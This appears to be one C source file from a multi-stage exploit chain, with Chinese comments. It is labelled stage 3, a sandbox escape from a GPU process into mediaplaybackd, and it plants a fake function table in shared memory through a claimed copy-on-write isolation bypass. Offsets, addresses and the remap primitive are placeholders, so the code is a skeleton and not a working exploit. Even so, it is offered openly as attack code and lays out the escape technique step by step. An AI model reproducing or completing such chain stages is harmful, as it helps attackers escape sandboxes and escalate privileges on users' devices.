/*
 * Stage3 — 沙箱逃逸 #2：GPU 进程 → mediaplaybackd
 * CVE-2025-43510 风格：Copy-on-Write（写时复制）隔离被绕过。
 * GPU 进程与 mediaplaybackd 之间的共享内存页本应 COW 隔离，
 * bug 导致一侧的修改在两侧同时可见 → 篡改 mediaplaybackd 上下文数据，
 * 获得其内部任意函数调用原语。
 */
#include <stdint.h>
#include <stdio.h>
#include <string.h>

#define SHARED_PAGE_SIZE     0x1000
#define MPD_FN_TABLE_OFFSET  0x18      /* mediaplaybackd 函数表偏移（占位） */
#define MPD_TARGET_FN        0x2000ULL /* 任意函数调用目标（占位） */

typedef struct {
    uint8_t  page[SHARED_PAGE_SIZE];
} shared_page_t;

static shared_page_t *shared = NULL;

/*
 * COW 绕过：
 * 1. GPU 进程对共享页触发写时复制
 * 2. bug：内核页表项未正确断开映射，mediaplaybackd 侧仍看到旧物理页
 * 3. 于是 GPU 侧写的伪函数表被 mediaplaybackd 按真表使用
 */
static void cow_bypass_write(uint64_t fake_fn_table_addr)
{
    /* PLACEHOLDER: 实际通过 mach_vm_remap / pmap 层原语实现 */
    volatile uint64_t *fn_table =
        (volatile uint64_t *)(shared->page + MPD_FN_TABLE_OFFSET);
    fn_table[0] = MPD_TARGET_FN;
    fn_table[1] = fake_fn_table_addr;
}

/*
 * mediaplaybackd 的权限比 GPU 进程宽：
 * 可加载任意 framework（这是 Stage4 加载 JSC 的前提）。
 */
int stage3_run(void)
{
    if (!shared) return -1;

    cow_bypass_write(0x4141414141414141ULL /* fake table 占位 */);

    /* 触发 mediaplaybackd 一次回调，伪函数表被调用 →
     * 在 mediaplaybackd 上下文内获得执行 */
    /* mpd_invoke_callback();  PLACEHOLDER */

    printf("[stage3] COW bypass applied, mediaplaybackd call primitive expected\n");
    return 0;
}
